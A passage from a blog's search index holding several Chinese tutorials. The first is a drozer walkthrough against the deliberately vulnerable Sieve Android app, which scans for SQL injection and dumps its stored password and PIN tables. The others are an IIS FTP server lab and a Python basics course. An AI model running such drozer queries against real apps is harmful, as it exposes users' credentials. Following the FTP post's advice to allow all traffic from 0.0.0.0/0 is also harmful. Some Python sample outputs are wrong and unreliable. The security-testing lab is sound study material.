//枚举uri\n```\n\n![](https://i.loli.net/2020/04/01/a6VeIRUypDYiCzQ.png)\n列出了可访问内容URI的列表和路径\n\n```bash\ndz> run scanner.provider.finduris -a com.mwr.example.sieve     //使用扫描器枚举uri\n```\n\n![](https://i.loli.net/2020/04/01/QfLMEex1olyTF2O.png)\n\n```bash\ndz> run scanner.provider.injection -a com.mwr.example.sieve     //检测可利用uri，检查sql注入\n```\n\n![](https://i.loli.net/2020/04/01/OvqE4BKm1IRoV7A.png)\n\n发现程序中存在三处注入\n\n```bash\ndz> run scanner.provider.sqltables -a  com.mwr.example.sieve //列出该app的表信息\n```\n\n![](https://i.loli.net/2020/04/01/adROPLf81oWsjnC.png)\n\n```bash\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/     //获取数据库数据（即为之前保存的密码，邮箱信息）\n```\n\n![](https://i.loli.net/2020/04/01/p5lW2XtSJgCVAwG.png)\n\n读取到Passwords表中的内容，可以看到用户名、密码、邮箱等信息\n\n```bash\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --vertical     //竖直显示数据库数据password和pin码\n```\n\n![](https://i.loli.net/2020/04/01/UbapG4iVgA3W8oh.png)\n\n读取到Key表中的内容,可以看到password和pin码\n\n### 6.7利用广播接收器\n\n```bash\nrun app.broadcast.info -a \nrun app.broadcast.send --component   --extra   \nrun app.broadcast.sniff --action \n```\n### 6.8开发服务\n\n```bash\nrun app.service.info -a \nrun app.service.start --action  --component  \nrun app.service.send   --msg    --extra    --bundle-as-obj\n```\n\n\n\n\n\n参考：[drozer之玩转sieve](https://blog.csdn.net/samlirongsheng/article/details/104926282)\n参考：[安卓四大组件审计实验（drozer） ](https://www.sohu.com/a/226017569_354899)\n参考：[Android安全测试框架Drozer（使用篇）](https://www.jianshu.com/p/dfa92bab3a55)\n参考:[drozer-Android安全测试基本使用教程（Windows10）](https://blog.csdn.net/jianglianye21/article/details/80667346)\n参考:官方指南（英文）[ Drozer 使用指南](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf)\n\n","tags":["Android"],"categories":["Course"]},{"title":"FTP服务器配置与管理","url":"/posts/11968.html","content":"\n## 一、 **实验环境**\n\n1. 操作系统：Windows系统、阿里云Windows Server 2016\n2. 实验设备：PC机\n## 二、 实验内容\n\n任务 1：FTP服务器的安装\n任务 2：创建FTP站点\n任务 3：配置客户端访问FTP站点\n任务 4：FTP访问配置\n\n## 三、 实验步骤与结果\n\n### 1. FTP服务器的安装\n\ni.       打开【服务器管理器】，单击【添加角色和功能】按钮，进入【添加角色和功能向导】。\nii.      单击【下一步】按钮，选择【基于角色或基于功能的安装单击【下一步】按钮，选择【从服务器池中选择服务器】，安装程序会自动检测与显示这台计算机采用静态IP地址设置的网络连接。\niii.      单击【下一步】，在【服务器角色】中，选择【Web服务器（IIS）】, 自动弹出【添加Web服务器（IIS）所需的功能】对话框，单击【添加功能】按钮。\niv.     单击【下一步】按钮，选择需要添加的功能，如无特殊需求，一般默认即可。\nv.      单击【下一步】按钮，在【服务器角色】中，勾选【FTP服务器】。\n<img src=\"https://i.loli.net/2020/03/21/StgI9R2dDKpVmNj.png\"/>\nvi.      单击【下一步】按钮，在【确认】对话框中，确认所需安装的角色、角色服务或功能，单击【安装】。安装完成后，单击【关闭】按钮完成安装。\n\n<img src=\"https://i.loli.net/2020/03/21/tUmu4sh2GeZI3LQ.png\" />\n\n### 2. 创建FTP站点\n\ni.      打开【服务器管理器】，单击【工具】，选择【Internet信息服务（IIS）管理器】。\nii.      右键单击【网站】，选择【添加FTP站点】。\niii.      在【添加FTP站点】对话框中，输入FTP站点的名称，设置该站点所提供文件的本地所在位置，单击【下一步】按钮。\n<img src=\"https://i.loli.net/2020/03/21/twbD613MfmJsC5j.png\"/>\niv.      设置FTP站点的绑定IP地址和端口号，在SLL选项中，选择【无SLL】（FTP的数据传输是明文传输，如果需要在安全性较高的环境下使用，可以选择【允许SLL】和【需要SSL】），单击【下一步】按钮。\n<img src=\"https://i.loli.net/2020/03/21/NB7KAgzE9jmwYvS.png\"/>\nv.      设置FTP站点的身份验证、授权和权限。在身份验证中，勾选【基本】。在授权中，选择【所有用户】均可访问。在权限中，勾选【读取】和【写入】两个权限，单击【完成】按钮。\n<img src=\"https://i.loli.net/2020/03/21/vCBoniJNufUlZcH.png\"/>\nvi.      FTP站点创建成功。\n<img src=\"https://i.loli.net/2020/03/21/K81px7b6dCh5OML.png\"/>\n\n在浏览器或者在此电脑地址框中输入`ftp://127.0.0.1`都可以成功访问FTP服务器\n\n![](https://i.loli.net/2020/03/22/noblh9EIYPGTRKO.png)\n\n![](https://i.loli.net/2020/03/22/HojKXOGYDWpfxzF.png)\n\n我们发现我的FTP服务器里面什么都没有，我们可以向我设定的默认FTP物理路径`C:\\FTP`中添加文件，例如添加一个logo.png\n![](https://i.loli.net/2020/03/22/J2NbdyCfWnVvQkA.png)\n然后我们就可以访问到添加的图片了\n\n![](https://i.loli.net/2020/03/22/eYNclhtw6LXviua.png)\n\n### 3. 配置客户端访问FTP站点\n\n> 上面我们已经实现了在服务器本地访问FTP,现在我们来实现在外网条件下来访问FTP服务器\n\ni. 设置安全组及防火墙，您需要在实例安全组的入方向添加一条放行FTP端口的安全组规则\n<img src=\"https://i.loli.net/2020/03/22/JY9TtZKg13hqXE2.png\"/>\n配置之后通过浏览器无法访问FTP服务器,查询之后发现，外网无法连接和访问Windows实例搭建的FTP，这种情况可能是由于以下两种原因导致的。\n\n- [安全组拦截外网访问](https://help.aliyun.com/knowledge_detail/40914.html#wWHYT)\n- [防火墙拦截FTP进程](https://help.aliyun.com/knowledge_detail/40914.html#aWGNP)\n\n如果搭建的FTP服务在外网无法连接和访问，请参考如下文档进行排查处理。 [在外网无法连接和访问Windows实例中的FTP服务](https://help.aliyun.com/document_detail/40914.html)\n\n**解决方法：**在 添加安全组规则 对话框，协议类型 选择 `全部`，授权对象 填写 `0.0.0.0/0`\n<img src=\"https://i.loli.net/2020/03/22/G1mUhDE4nFHwtI9.png\" />\n然后就可以通过浏览器正常访问FTP服务器了\n<img src=\"https://i.loli.net/2020/03/22/fwEoInbaVYp1Q3A.png\"/>\n我通过计算机的地址栏访问，又报如下错误\n![](https://i.loli.net/2020/03/22/xlHW5CJMyFGqiOR.png)\n解决方法：打开IE 浏览器 -- 工具 -- Internet 选项 -- 高级 -- 设置 -- 浏览 -- 把 使用被动FTP （用于防火墙和 DSL 调制解调器的兼容） 前面的勾去掉.\n修改之后就可以成功访问了\n![](https://i.loli.net/2020/03/22/TzponZCfH9l3qVr.png)\n\n\n\n###  4. FTP访问配置\n\n#### 4.1 IP地址限制\n\n打开FTP IP地址限制和域限制\n![](https://i.loli.net/2020/03/24/k4sMOrf6LTbqhwS.png)\n\n\n点击添加拒绝条目，输入要限定的IP地址\n\n![](https://i.loli.net/2020/03/24/A9P5e3rQbw4BpSZ.png)\n客户端再访问FTP就弹出登录框，无法再访问FTP,删除拒绝IP又可以继续访问FTP\n\n<img src=\"https://i.loli.net/2020/03/24/5UnqGgCdVcKZh4E.png\"/>\n\n#### 4.2 身份验证\n\n打开FTP身份验证\n\n![](https://i.loli.net/2020/03/24/xinPTYCMsdNgu3Z.png)\n\n匿名身份验证开启可直接访问FTP,基本身份验证开启需要输入管理员用户名和密码\n\n![](https://i.loli.net/2020/03/24/pseAuZgRatKbUjO.png)\n\n实际工作中一般不会使用管理账号来访问FTP,因此我们需要添加一些专门用于FTP访问的账号，打开计算机管理在本地用户和组中新建用户\n\n<img src=\"https://i.loli.net/2020/03/24/PqvuBgsOEbxMAFV.png\"/>\n\n设置用户名和密码\n\n<img src=\"https://i.loli.net/2020/03/24/BgDoX1PispKeqwE.png\"/>\n\n设置新建用户所在组对FTP的访问权限\n\n<img src=\"https://i.loli.net/2020/03/24/9zBnQdYilA3aGq5.png\"/>\n\n在客户端输入新建的用户的信息就可以正常访问FTP了\n\n<img src=\"https://i.loli.net/2020/03/24/82qocGQStIeuzFw.png\"/>\n\n#### 4.3 授权规则\n\n打开FTP授权规则，点击添加允许规则，可以设定授权规则\n例如：我们可以设匿名用户只能读取，指定用户可以读取和写入等等操作\n\n<img src=\"https://i.loli.net/2020/03/24/gG6TvA8xNCPzwmn.png\"/>\n\n#### 4.4 请求筛选\n\n打开FTP请求筛选，可以设置拒绝放入或者上传的文件扩展名等等操作\n\n<img src=\"https://i.loli.net/2020/03/24/7gWYcTVIwOznmha.png\"/>\n\n\n\n​          \n","tags":["FTP服务器","Windows服务器配置与管理"],"categories":["Course"]},{"title":"Python：基础&爬虫","url":"/posts/34992.html","content":"\n<center><font color=pink size=8>Python爬虫学习</font></center>\n\n## 前言\n\n爬虫学习暂时咕咕了。。。，等有空再继续更新\n\n## 一、基础知识准备\n\n> Python基础语法还是很简单的，我通过一个个简单的小段代码来进行学习，所需掌握的知识点都包含在这段段代码中，每段代码都有相应详细注释，如果你有其他语言的基础那么Python基础就是轻轻松松的事。\n\n### 1 条件判断语句\n\n```python\nscore = 60\nif score >=90 and score <=100:\n    print(\"本次考试等级为A\")\nelif score >=70 and score <90:  #elif == else if\n    print(\"本次考试等级为B\")      \nelse:\n    print(\"本次考试等级为C\")      #output: 本次考试等级为C\n```\n\n### 2 循环语句\n\n#### 2.1 for循环\n\n```python\nfor i in range(5): #输出5个数 [0 1 2 3 4]\n    print(i)\n\nfor i in range(0,10,3):#从[0,10)，以3为间距输出                #output: [0 3 6 9]\n    print(i)\n\n\nfor i in range(-10,-100,-30):#从[-10，-100)，以-30为间距     #output: [-10 -40 -70]\n    print(i)\n\n\n\nname=\"chengdu\" \nfor x in name:\n    print(x)            #output: [c h e n g d u]\n\n    \na = [\"a\", \"b\", \"c\"] \nfor i in range(len(a)):\n     print(i, a[i])    #output: [0 a 1 b 2 c]\n```\n\n####  2.2 while循环\n\n```python\ni=0\nwhile i<3:\n    print(\"这是第%d次循环：\"%(i+1))\n    print(\"i=%d\"%i)\n    i+=1\n\n'''#output: \n这是第1次循环：\ni=0\n这是第2次循环：\ni=1\n这是第3次循环：\ni=2\n'''\n```\n\n```python\ncount = 0\nwhile count<3:\n    print(count,\"小于3\")\n    count +=1\nelse:\n    print(count,\"大于或等于3\")\n    \n'''#output: \n0 小于3\n1 小于3\n2 小于3\n3 大于或等于3\n'''\n```\n### 3 字符串\n\n```python\nstr=\"chengdu\"\t\t\t  \nprint(str)                #chengdu\nprint(str[0])             #c\nprint(str[0:5])           #[0,5) cheng\nprint(str[1:7:2])         #[起始位置：结束位置：步进值] hnd\nprint(str[5:])            #显示5以后的 du\nprint(str[:5])            #显示5以前的 cheng\nprint(str+\",hello\")       #字符串连接 chengdu,hello\nprint(str*3)              #打印3次 chengduchengduchengdu\nprint(\"hello\\nchengdu\")   #\\n换行 hello  chengdu\nprint(r\"hello\\nchengdu\")  #前面加\"r\"，表示显示原始字符串，不进行转义hello\\nchengdu\nprint(\"-\"*30)             #打印30个“-”\n```\n\n### 4 列表-List\n\n> 列表中的每个元素都分配一个数字 - 它的位置或索引，第一个索引是0，第二个索引是1，依此类推。\n#### 4.1 列表定义\n```python\nnamelist = [\"小张\",\"小王\",\"小李\"]\ntestlist = [1,\"测试\",\"str\"]  #列表中可以存储混合类型\ntestlist = [[\"a\",\"b\"],[\"c\",\"d\"],[\"e\",\"f\",\"g\"]] #列表嵌套\n```\n#### 4.2 列表元素输出\n\n```python\nnamelist = [\"小张\",\"小王\",\"小李\"]\n#输出指定元素\nprint(namelist[1])     #output: 小王\n\n#遍历输出\nfor name in namelist: \n    print(name)\n   \n'''output\n小张\n小王\n小李\n'''    \n\n#使用枚举函数enenumerate()，同时拿到列表下标和元素类容\nfor i,name in enumerate(namelist): \n    print(i,name)\n    \n'''output\n0 小张\n1 小王\n2 小李\n'''\n```\n#### 4.3 列表元素切片\n\n如下所示：L=['Google', 'Python', 'Taobao']\n\n| Python | 表达式 结果          | 描述                               |\n| :----- | :------------------- | ---------------------------------- |\n| L[2]   | 'Taobao'             | 读取第三个元素                     |\n| L[-1]  | 'Taobao'             | 读取最后一个元素                   |\n| L[1:]  | ['Python', 'Taobao'] | 输出从第二个元素开始后的所有元素   |\n| L[:-1] | ['Google', 'Python'] | 输出从第一个到倒数第一个的所有元素 |\n| L[-2:] | ['Python', 'Taobao'] | 输出从倒数第二个到末尾的所有元素   |\n\n#### 4.4 列表元素追加\n\n```python\n#append\na = [1,2]\nb = [3,4]\na.append(b)  #将b列表当做一个元素加入到a中\nprint(a)     #output: [1, 2, [3, 4]]\n\n#extend\na = [1,2]\nb = [3,4]\na.extend(b) #将b列表中的诶个元素，逐一追加到a中\nprint(a)    #output: [1, 2, 3, 4]\n\n#insert\na=[1,2,4]\na.insert(2,3) ##在下标为2的位置插入3   #指定下标位置插入元素（第一个表示下标，第二个表示元素）\nprint(a)  #output: [1, 2, 3, 4] \n```\n#### 4.5 列表元素删除\n\n```python\n#del\na = [\"小张\",\"小王\",\"小李\"]\ndel a[2]                      #删除指定下标元素\nprint(a)                      #output: ['小张', '小王']\n\n#pop\na = [\"小张\",\"小王\",\"小李\"]\na.pop()                      #弹出末尾元素\nprint(a)                     #output: ['小张', '小王']\n\n#remove\na = [\"小张\",\"小王\",\"小李\"]\na.remove(\"小李\")             #直接删除指定内容的元素\nprint(a)                    #output: ['小张', '小李']\n```\n#### 4.6 列表元素修改\n\n```python\na = [\"小张\",\"小王\",\"小李\"]\na[2] = \"小红\"\t\t\t\t #修改指定下标元素内容\nprint(a) \t\t\t\t  #output: ['小张', '小王', '小红']\n```\n\n#### 4.7 列表元素查找\n\n```python\n#in / not in\na = [\"小张\",\"小王\",\"小李\"]\nfindName = input(\"请输入你要查找的学生姓名：\")\nif findName in a:\n    print(\"找到\")\nelse:\n    print(\"未找到\")\n    \n#index\na = [\"小张\",\"小王\",\"小李\"]\nprint(a.index(\"小王\",0,2))    #可以查找指定下标范围的元素，并返回找到对应数据的下标  #output: 1\nprint(a.index(\"小李\",0,2))   #范围区间：左开右闭[0,2) # ValueError: '小李' is not in list\n\n#count\nprint(a.count(\"小王\"))      #查找某个元素出现的次数  #output: 1\n```\n\n#### 4.8 列表元素反转和排序\n\n```python\na = [1,4,2,3]\na.reverse()             #将列表所有元素反转\nprint(a)                #output: [3, 2, 4, 1]\n \na.sort()                #升序\nprint(a)                #output: [1, 2, 3, 4]\n\na.sort(reverse=True)    #降序\nprint(a)                #output: [1, 2, 3, 4]\n```\n### 5 前段知识综合练习\n\n> Topic:  将8个老师随机分配到3个办公室\n\n```python\nimport random\noffices = [[],[],[]]\t\t\t\t\t\t\t#3个教室\nteachers = [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\"]\t#8个老师\nfor teacher in teachers:                 \t\t#遍历teachers放入office中\n    index = random.randint(0,2)   \t\t \t\t#产生随机数0,1,2\n    offices[index].append(teacher)     \t\t    #将teachers追加到office中\ni=1 #office1\nfor office in offices:                \t\t\t #输出每个office人数和对应的老师\n    print(\"office%d的人数为：%d\"%(i,len(office)))\n    i += 1  #遍历offices\n    for name in office:\n        print(\"%s\"%name,end=\"\\t\")    \t\t\t #打印每个office老师的名字\n    print(\"\\n\")                       \t\t\t #打印完一个office换行\n    print(\"-\"*20)                    \t\t\t #打印完一个office输出20个-\n```\n###  6 元组-Tuple\n\n> 元组与列表类似，不同之处在于元组的元素不能修改。\n> 元组使用小括号，列表使用方括号。\n\n#### 6.1 元组定义\n\n```python\ntup1=()     #空元组\ntup2=(5)    #<class 'int'>  不是元组\ntup2=(5,)   #<class 'tuple'>\ntup3 = ('Google', 'Python', 1997, 2000)\n```\n#### 6.2 元组元素切片\n\n```python\ntup=(1,2,3)\nprint(tup[0])    #第一个元素     #output:  1\nprint(tup[-1])   #最后一个元素   #output:  3\nprint(tup[0:2])  #左闭右开[0,2) #output:  (1, 2)\n```\n####  6.3 元组元素增加(连接)\n\n```python\ntup1 = (12,34,56)\ntup2 = (\"ab\",\"cd\",\"ef\")\ntup3 = tup1+tup2\nprint(tup3)          #(12, 34, 56, 'ab', 'cd', 'ef')\n```\n#### 6.4 元组元素删除\n\n```python\ntup1 = (12,34,56)\n#del tup1[0]    #不允许删除单个元素\ndel tup1        #删除了整个元组变量\n```\n#### 6.5 元组元素不能修改\n\n```python\ntup1 = (12,34,56)\ntup1[0] = 72  #报错 不能修改\n```\n\n### 7 字典-dict\n\n>字典使用键值对(key=>value)存储；键必须是唯一的，但值则不必。\n\n#### 7.1 字典定义\n\n```python\ndict = {key1 : value1, key2 : value2 }\ninfo = {\"name\":\"简简\",\"age\":18}\n```\n#### 7.2 字典访问\n\n```python\ninfo = {\"name\":\"简简\",\"age\":18}\nprint(info[\"name\"])\nprint(info[\"age\"])\n\n#访问不存在键\nprint(info[\"sex\"])               #直接访问不存在的键，会报错\nprint(info.get(\"sex\"))           #使用get()方法，访问不存在的键，默认返回：none\nprint(info.get(\"sex\",\"没有\"))     #没有找到的时候，返回自定义值  #output： 没有\n```\n#### 7.3 字典键值增加\n\n```python\ninfo = {\"name\":\"简简\",\"age\":18}\ninfo[\"sex\"]=\"man\"   \t\t\t#新增sex\nprint(info)         \t\t\t#output: {'name': '简简', 'age': 18, 'sex': 'man'}\n```\n#### 7.4 字典键值删除\n\n```python\n#del\ninfo = {\"name\":\"简简\",\"age\":18}\ndel info[\"name\"]                #删除name键值对\nprint(info)                     #output: {'age': 18}\n\ndel info                        #删除整个字典\nprint(info)                     #output: NameError: name 'info' is not defined\n\n#clear\ninfo = {\"name\":\"简简\",\"age\":18}\ninfo.clear()                     #清空字典内键值对\nprint(info)                      #output: {}\n```\n#### 7.5 字典键值修改\n\n```python\ninfo = {\"name\":\"简简\",\"age\":18}\ninfo[\"age\"]=20\nprint(info)\n```\n#### 7.6 字典键值查找\n\n```python\ninfo = {\"name\":\"简简\",\"age\":18}\nprint(info.keys())               #得到所有的键     #output: dict_keys(['name', 'age'])\nprint(info.values())             #得到所有的值     #output: dict_values(['简简', 18])\nprint(info.items())     \t\t #得到所有的键值对 #output: dict_items([('name', '简简'), ('age', 18)])\n\n\n#遍历所有的键\nfor key in info.keys():\n    print(key)     #output: name age\n    \n#遍历所有的值\nfor value in info.values():\n    print(value)     #output: 简简 18\n    \n#遍历所有的键值对\nfor key,value in info.items():\n        print(\"(key=%s,value=%s)\"%(key,value)) \n#output: (key=name,value=简简) (key=age,value=18)\n```\n\n### 8 函数\n\n#### 8.1 函数定义和使用\n\n```python\ndef printinfo(a,b): #函数定义\n    c =a + b\n    print(c)\n\nprintinfo(1,2) \t\t#函数的使用\n```\n\n#### 8.2 带返回值的函数\n\n```python\ndef info(a,b):\n    c =a + b\n    return c \t\t#返回值\n\nprint(info(1,2)) \n```\n\n#### 8.3 返回多个值的函数\n\n```python\ndef divid(a,b):\n    shang = a//b\n    yushu = a%b\n    return shang,yushu #多个返回值用逗号隔开\n\nsh,yu = divid(5,2)     #需要用多个值来保存返回内容\nprint(\"商：%d 余数:%d\"%(sh,yu))\n```\n\n### 9 文件操作\n\n#### 9.1 打开文件(open)\n\n用法：对象=open(文件名，访问模式)\n\n```python\nf = open('test.txt', 'w')\n```\n| 模式   | 说明                                                         |\n| ------ | ------------------------------------------------------------ |\n| **r**  | 以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。 |\n| **w**  | 打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。 |\n| a      | 打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。 |\n| **rb** | 以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。 |\n| **wb** | 以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。 |\n| ab     | 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。 |\n| r+     | 打开一个文件用于读写。文件指针将会放在文件的开头。           |\n| w+     | 打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。 |\n| a+     | 打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。 |\n| rb+    | 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。 |\n| wb+    | 以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。 |\n| ab+    | 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。 |\n\n\n#### 9.2 关闭文件(close)\n\n用法：对象.close()\n\n```python\nf.close()\n```\n#### 9.3 写数据(write)\n\n用法：对象.write()\n```python\nf=open(\"test.txt\",\"w\")  # 打开文件，w(写模式)-文件不存在就在当前路径给你新建一个\nf.write(\"hello,world\")  # write将字符写入文件\nf.close()\n```\n#### 9.4 读数据(read)\n\n用法：对象.read()\n\n```python\nf=open(\"test.txt\",\"r\")   #打开文件，r(读模式)\ncontent=f.read(5)        #read读取5个字符\nprint(content)\nf.close()\n```\n\n#### 9.5 读一行数据(readline)\n\n用法：对象.readline()\n\n```python\nf = open('test.txt', 'r')\ncontent = f.readline()\nprint(\"1:%s\"%content)#读取一行\ncontent = f.readline()\nprint(\"2:%s\"%content)#再读下一行\nf.close()\n```\n\n#### 9.6 读多行数据(readlines)\n\n用法：对象.readlines()\n\n```python\nf=open(\"test.txt\",\"r\")   #打开文件，r(读模式)\ncontent=f.readlines()    #readlines读取整个文件，以列表形式输出\nprint(content)           #输出形式为列表 #output: ['hello,world\\n', 'hello,world']\n\n#对列表进行处理，按序号一行一行输出\ni=1\nfor temp in content:\n    print(\"%d:%s\" % (i, temp))\n    i += 1  #output: 1:hello,world 2:hello,world\nf.close() \n```\n\n#### 9.7 OS模块\n\n- 使用该模块必须先导入模块：\n\n```\n    import os\n```\n\n##### os模块中的函数:\n\n| 序号 | 函数名称     | 描述                                          | 格式                                                         |\n| ---- | ------------ | --------------------------------------------- | ------------------------------------------------------------ |\n| 1    | getcwd()     | 获取当前的工作目录                            | 格式：os.getcwd() 返回值：路径字符串                         |\n| 2    | chdir()      | 修改当前工作目录                              | 格式:os.chdir() 返回值:None                                  |\n| 3    | listdir()    | 获取指定文件夹中的 所有文件和文件夹组成的列表 | 格式:os.listdir(目录路径) 返回值：目录中内容名称的列表       |\n| 4    | mkdir()      | 创建一个目录/文件夹                           | 格式：os.mkdir(目录路径) 返回值：None                        |\n| 5    | makedirs()   | 递归创建文件夹                                | 格式:os.makedirs(路径)                                       |\n| 6    | rmdir()      | 移除一个目录（必须是空目录）                  | 格式：os.rmdir(目录路径) 返回值:None                         |\n| 7    | removedirs() | 递归删除文件夹                                | 格式：os.removedirs(目录路径) 返回值：None 注意最底层目录必须为空 |\n| 8    | rename()     | 修改文件和文件夹的名称                        | 格式：os.rename(源文件或文件夹，目标文件或文件夹) 返回值：None |\n| 9    | stat()       | 获取文件的相关 信息                           | 格式：os.stat(文件路径) 返回值：包含文件信息的元组           |\n| 10   | system()     | 执行系统命令                                  | 格式:os.system() 返回值：整型 慎用！ 玩意来个rm -rf 你就爽了！ |\n| 11   | getenv()     | 获取系统环境变量                              | 格式：os.getenv(获取的环境变量名称) 返回值：字符串           |\n| 12   | putenv()     | 设置系统环境变量                              | 格式：os.putenv('环境变量名称',值) 返回值：无 注意：无法正常的getenv检测到。 |\n| 13   | exit()       | 推出当前执行命令，直接关闭当前操作            | 格式:exit() 返回值：无                                       |\n\n### 10 异常处理\n\n#### 10.1 异常简介\n\n```python\n print '-----test--1---'  \n    open('123.txt','r')  \n print '-----test--2---'\n```\n\n![image-20200323100011079](https://i.loli.net/2020/03/23/5N6k7RWfDiqSdhb.png)\n\n> 打开一个不存在的文件123.txt，当找不到123.txt 文件时，就会抛出给我们一个IOError类型的错误，No such ﬁle or directory：123.txt （没有123.txt这样的文件或目录）\n\n#### 10.2 捕获异常\n\n```python\ntry:\n \tprint('-----test--1---')  \n    open('123.txt','r') \t \t \n    print('-----test--2---')\nexcept IOError:\n    pass\n```\n\n> 此程序看不到任何错误，因为用except 捕获到了IOError异常，并添加了处理的方法\n> pass 表示实现了相应的实现，但什么也不做；如果把pass改为print语句，那么就会输出其他信息\n\n**总结：**\n\n![image-20200323100335376](https://i.loli.net/2020/03/23/vwhZio7kpmXKgfd.png)\n把可能出现问题的代码，放在try中\n把处理异常的代码，放在except中\n\n\n```python\ntry:\n  print num \nexcept IOError:\n  print('产生错误了')\n```\n\n上例程序，已经使用except来捕获异常，但是还会看到错误的信息提示\n\n> except捕获的错误类型是IOError，而此时程序产生的异常为 NameError ，所以except没有生效\n\n```python\ntry:\n  print num\nexcept NameError:\n  print('产生错误了')\n```\nPython的一些內建异常：\n| 异常              | 描述                         |\n| ----------------- | ---------------------------- |\n| Exception         | 常规错误的基类               |\n| AttributeError    | 对象没有这个属性             |\n| IOError           | 输入/输出操作失败            |\n| IndexError        | 序列中没有此索引(index)      |\n| KeyError          | 映射中没有这个键             |\n| NameError         | 未声明/初始化对象 (没有属性) |\n| SyntaxError       | Python 语法错误              |\n| TypeError         | 对类型无效的操作             |\n| ValueError        | 传入无效的参数               |\n| ZeroDivisionError | 除(或取模)零 (所有数据类型)  |\n更多可以参考：http://blog.csdn.net/gavin_john/article/details/50738323\n\n#### 10.3 捕获多个异常\n\n```python\n#coding=utf-8 \ntry:\n print('-----test--1---')\n open('123.txt','r') # 如果123.txt文件不存在，那么会产生 IOError 异常  \n print('-----test--2---')\n print(num)# 如果num变量没有定义，那么会产生 NameError 异常\n except (IOError,NameError):\n #如果想通过一次except捕获到多个异常可以用一个元组的形式\n```\n\n#### 10.4 获取异常的信息描述\n\n![image-20200323102016442](https://i.loli.net/2020/03/23/tWHDsvy6B9uZf4i.png)\n\n![image-20200323102023020.png](https://i.loli.net/2020/03/23/6HZSOU1LxERMkzp.png)\n\n#### 10.5 try...ﬁnally...\n\n>在程序中，如果一个段代码必须要执行，即无论异常是否产生都要执行，那么此时就需要使用ﬁnally。 比如文件关闭，释放锁，把数据库连接返还给连接池等\n\n```python\nimport time\ntry:\n    f = open('test.txt')\n    try:\n        while True:\n            content = f.readline()\n            if len(content) == 0:\n                break\n            time.sleep(2)\n            print(content)\n    except:\n         #如果在读取文件的过程中，产生了异常，那么就会捕获到  \n         #比如 按下了 ctrl+c\n        pass\n    finally:\n        f.close()\n        print('关闭文件')\nexcept:\n    print(\"没有这个文件\")\n```\n\ntest.txt文件中每一行数据打印，但是我有意在每打印一行之前用time.sleep方法暂停2秒钟。这样做的原因是让程序运行得慢一些。在程序运行的时候，按Ctrl+c中断（取消）程序。\n我们可以观察到KeyboardInterrupt异常被触发，程序退出。但是在程序退出之前，ﬁnally从句仍然被执行，把文件关闭。\n\n### 11 Python知识\n\n#### 除法\n\n- 除 /\n- 整除 //\n- 求余 %\n- 商和余数的元组 divmod\n\n#### 移位操作\n\n##### 左移（<<）\n\n`a<<n，则a' =a*(2^n)`，左移 n 位相当于原操作数乘以 2^n，原操作数不发生变化。\n\n```python\n>>> 3<<1      # 向右移动一位，相当于是乘以2\n6             \n>>> -3<<2     # 向右移动一位，相当于是乘以4\n-12\n```\n\n##### 右移（>>）\n\n`a>>n，则a' =a//(2^n)`，左移 n 位相当于原操作数整除 2^n，原操作数不发生变化。\n\n```python\n>>> 2>>1     # 移动一位，相当于是2//2\n1            \n>>> 2>>2     # 相当于先左移一位得到1，结果1再除以2等于0\n0\n>>> 2>>3     # 相当于2//8\n0  \n          \n>>> -8>>2    # 移动2位，相当于-8//4\n-2\n>>> -8>>3    # 移动3位，相当于是用结果-2再除以2\n-1\n>>> -8>>4    # 移动4位，相当于是用结果-1再除以2\n-1\n```\n\n如果操作数是正数，那么对之不停进行右移操作，最终结果一定可以得到 `0`；如果操作数是负数，对之不停进行右移操作，最终结果一定可以得到 `-1`。\n\n#### 匿名函数lambda\n\n匿名函数 lambda 是指一类无需定义标识符（函数名）的函数或子程序。\nlambda 函数可以接收任意多个参数 (包括可选参数) 并且返回单个表达式的值。\n\n语法：\n\n```python\nlambda [arg1,arg2,.....argn]:expression\n```\n\n冒号前是参数，可以有多个，用逗号隔开，冒号右边的为表达式（只能为一个）。其实lambda返回值是一个函数的地址，也就是函数对象。\n\n```python\nlambda arg: print(\"hello,world\",arg)\n```\n\nlambda表达式限制只能包含一行代码，但是其实可以利用元组或列表强行让其包含多行。（但是这么做会严重影响可读性，除非万不得已不要使用）\n\n```python\nlambda :(\n    print(\"hello\"),\n    print(\"world\"),           \n)\n```\n\n#### 切片\n\n![](https://img.jwt1399.top//img/20210804114529.png)\n\n```python\nt=[1,2,3,4,5]\n\nprint(t[1:])     取第二个到最后一个元素\n结果：[2 3 4 5]\n\nprint(t[:])     取所有元素\n结果：[1 2 3 4 5]\n\nprint(t[1:3])     取t[1]-t[2]\n结果：[ 2 3 ]\n\nprint(t[:-1])     除了最后一个取全部\n结果：[ 1 2 3 4 ]\n \nprint(t[::-1])     取从后向前（相反）的元素\n结果：[ 5 4 3 2 1 ]\n \nprint(t[2::-1])     取从下标为2的元素翻转读取\n结果：[ 3 2 1 ]\n```\n\n#### 字符串方法\n\n#####  join(iterable)\n\n> 获取可迭代对象(iterable)中的所有项目，并将它们连接为一个字符串。\n\n实例1：\n\n```python\nmyTuple = (\"Bill\", \"Steve\", \"Elon\")\nx = \"#\".join(myTuple)\nprint(x)\n\n'''\n输出：\nBill#Steve#Elon\n'''\n```\n\n实例2：\n\n```python\nmyDict = {\"name\": \"Bill\", \"country\": \"USA\"}\nmySeparator = 